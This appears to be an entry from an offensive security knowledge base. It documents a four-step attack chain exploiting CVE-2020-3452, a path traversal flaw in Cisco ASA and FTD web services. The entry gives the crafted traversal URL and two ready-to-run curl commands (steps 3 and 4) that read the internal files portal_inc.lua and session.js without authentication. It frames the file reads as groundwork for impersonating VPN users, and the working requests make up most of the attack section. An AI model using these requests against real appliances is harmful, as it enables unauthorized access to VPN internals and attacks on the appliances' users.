---
id: ac-cve-2020-3452-path-traversal
tags:
  - path-traversal
  - cve-2020-3452
  - cisco-asa
  - file-read
  - vpn-impersonation
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Cisco ASA
  - Cisco FTD
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Browser-Based-Path-Traversal-Exploitation]]'
  - '[[procedures/Command-Line-Path-Traversal-Exploitation-with-Curl]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:06.404Z'
description: >-
  Exploits CVE-2020-3452, a path traversal vulnerability in Cisco ASA and FTD
  web services, to read arbitrary files in the web services file system,
  enabling potential VPN user impersonation.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Read-Only Path Traversal in Cisco ASA Web Services to Access Internal VPN Files

Multi-stage attack chain demonstrating exploitation of CVE-2020-3452 to perform read-only path traversal on Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD) web services interface, allowing access to internal files like portal_inc.lua and session.js for potential VPN user impersonation.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Web Endpoint] --> B[Browser Exploitation]
    B --> C[Command-Line Exploitation]
    C --> D[File Analysis for Impersonation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Cisco ASA Software or Cisco Firepower Threat Defense (FTD) Software with web services interface enabled (e.g., for Clientless SSL VPN or AnyConnect)
- Exposed HTTPS port (typically 443) for WebVPN services
- No authentication required for the endpoint

### Initial Access Requirements

- Network access to the target's web services interface (e.g., https://target/+CSCOT+/)
- No prior credentials needed; unauthenticated remote access

## Detailed Attack Procedures

### Step 1: Navigate to Vulnerable Endpoint
procedure: [[procedures/Browser-Based-Path-Traversal-Exploitation]]

**Objective**: Access the translation-table endpoint using directory traversal to trigger file download of internal content.

**Instructions**: Open a web browser and navigate to the crafted URL: https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../. This exploits the lack of input validation on the 'lang' parameter.

**Expected Output**: Browser prompts download of a 'translation-table' file containing the contents of portal_inc.lua.

**Success Indicators**:
- Download prompt appears
- File contains Lua script code from internal file

### Step 2: Download and Observe Internal File
procedure: [[procedures/Browser-Based-Path-Traversal-Exploitation]]

**Objective**: Inspect the downloaded file to view sensitive internal web services content.

**Instructions**: Save the downloaded file and open it in a text editor to observe the Lua code, which may reveal VPN session handling logic.

**Expected Output**: Text file displaying the full content of portal_inc.lua, including potential sensitive strings or functions.

**Success Indicators**:
- File opens without errors
- Content matches expected internal file structure (e.g., Lua functions for portal inclusion)

### Step 3: Command-Line Download of portal_inc.lua
procedure: [[procedures/Command-Line-Path-Traversal-Exploitation-with-Curl]]

**Objective**: Use curl to fetch and save the internal portal_inc.lua file via path traversal.

**Instructions**: Execute [[commands/curl-download-portal-inc-lua]] to send the HTTP GET request:

```bash
curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

**Expected Output**: File 'portal_inc.lua' saved locally with the internal file's binary/text content.

**Success Indicators**:
- HTTP response code 200
- File size matches expected (non-zero)
- Content verifiable as Lua script

### Step 4: Command-Line Download of session.js
procedure: [[procedures/Command-Line-Path-Traversal-Exploitation-with-Curl]]

**Objective**: Fetch additional internal file session.js to gather more data for impersonation.

**Instructions**: Run [[commands/curl-download-session-js]] with the modified textdomain:

```bash
curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

**Expected Output**: File 'session.js' saved with JavaScript code related to session management.

**Success Indicators**:
- Successful download
- File contains JS functions for VPN sessions

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to internal web services files via path traversal
2. Download of sensitive Lua and JS files revealing VPN logic
3. Potential for crafting impersonation attacks on Clientless SSL VPN or AnyConnect users

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
